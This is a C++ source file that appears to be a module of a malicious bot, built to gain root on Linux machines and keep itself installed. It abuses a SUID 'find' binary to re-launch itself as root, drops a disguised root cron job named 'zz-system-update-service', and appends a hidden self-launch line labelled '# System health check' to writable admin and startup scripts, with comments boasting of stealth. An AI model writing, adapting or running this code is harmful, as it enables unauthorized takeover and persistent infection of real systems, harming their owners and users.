#include <iostream>
#include <vector>
#include <string>
#include <functional>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <cstdio>
#include <sstream>
#include <sys/utsname.h>
#include <algorithm>
#include <filesystem>

// --- Module Callback Type ---
using module_callback_t = std::function<void(const std::vector<char>&)>;

// --- Privilege Escalation Module ---

// --- Helper Functions ---
void send_status(const std::string& msg, module_callback_t& send_output) {
    send_output(std::vector<char>(msg.begin(), msg.end()));
}

std::string execute_silent_command(const std::string& cmd) {
    FILE* pipe = popen((cmd + " 2>/dev/null").c_str(), "r");
    if (!pipe) return "";
    char buffer[256];
    std::string result = "";
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        result += buffer;
    }
    pclose(pipe);
    return result;
}

std::string get_self_path() {
    std::string path = execute_silent_command("readlink /proc/self/exe");
    path.erase(std::remove(path.begin(), path.end(), '\n'), path.end());
    return path;
}

// --- Assassination Vectors ---

// Vector 1: SUID Binary Exploitation
void hunt_suid_binaries() {
    std::string find_cmd = "find / -perm -u=s -type f -name find 2>/dev/null";
    std::string find_path = execute_silent_command(find_cmd);
    find_path.erase(std::remove(find_path.begin(), find_path.end(), '\n'), find_path.end());

    if (!find_path.empty()) {
        std::string self_path = get_self_path();
        if (self_path.empty()) return;
        
        std::string exploit_cmd = find_path + " . -exec " + self_path + " \; -quit";
        if (fork() == 0) {
            setsid(); // Detach from the current session
            execl("/bin/sh", "sh", "-c", exploit_cmd.c_str(), (char *) NULL);
            exit(0); // Exit child process
        }
    }
}

// Vector 2: Writable Cron Hijacking
void hunt_cron_jobs() {
    std::string self_path = get_self_path();
    if (self_path.empty()) return;
    
    std::string cron_file_path = "/etc/cron.d/zz-system-update-service";
    
    if (access("/etc/cron.d", W_OK) == 0) {
        std::ofstream cron_file(cron_file_path);
        if (cron_file.is_open()) {
            cron_file << "* * * * * root " << self_path << std::endl;
            cron_file.close();
        }
    }
}

// Vector 3: The Trojan Horse - Hijacking Admin Scripts
void plant_trojan() {
    std::string self_path = get_self_path();
    if (self_path.empty()) return;

    // A list of common admin script locations to target
    std::vector<std::string> target_dirs = {"/etc/profile.d/", "/usr/local/bin/", "/etc/init.d/"};
    
    // The payload to inject. It's a silent execution of our bot.
    std::string payload = "\n# System health check\n(nohup " + self_path + " >/dev/null 2>&1 &)\n";

    for (const auto& dir : target_dirs) {
        try {
            for (const auto& entry : std::filesystem::directory_iterator(dir)) {
                if (entry.is_regular_file() && (entry.status().permissions() & std::filesystem::perms::owner_exec) != std::filesystem::perms::none) {
                    std::string target_path = entry.path().string();
                    
                    // Check if we can write to the script
                    if (access(target_path.c_str(), W_OK) == 0) {
                        std::ifstream file_in(target_path);
                        std::stringstream buffer;
                        buffer << file_in.rdbuf();
                        std::string file_contents = buffer.str();
                        file_in.close();

                        // Check if our payload is already there
                        if (file_contents.find(payload) == std::string::npos) {
                            std::ofstream file_out(target_path, std::ios_base::app);
                            file_out << payload;
                            file_out.close();
                            // The trap is set. The ninja vanishes. We only need one.
                            return;
                        }
                    }
                }
            }
        } catch (const std::filesystem::filesystem_error& e) {
            // Directory might not exist, just ignore and continue.
        }
    }
}


extern "C" void run(const std::vector<char>& data, module_callback_t send_output) {
    if (geteuid() == 0) {
        return; // The deed is already done.
    }

    // A true ninja works in the shadows and does not announce his presence.
    // He tries every technique. If one succeeds, the bot will be reborn as a god.
    // The silence is the message. The successful re-registration as root is the proof.
    
    // Attempt 1: The Way of the SUID Blade
    hunt_suid_binaries();
    sleep(1); // Give the fork a moment to strike
    if (geteuid() == 0) return;

    // Attempt 2: The Way of the Timed Poison
    hunt_cron_jobs();
    // This trap may take up to 60 seconds to spring. The ninja is patient.

    // Attempt 3: The Way of the Patient Betrayal
    plant_trojan();
    
    // The ninja's work is done. He vanishes, leaving his traps to do their deadly work.
    // No final report is sent. The successful kill is the only message that matters.
}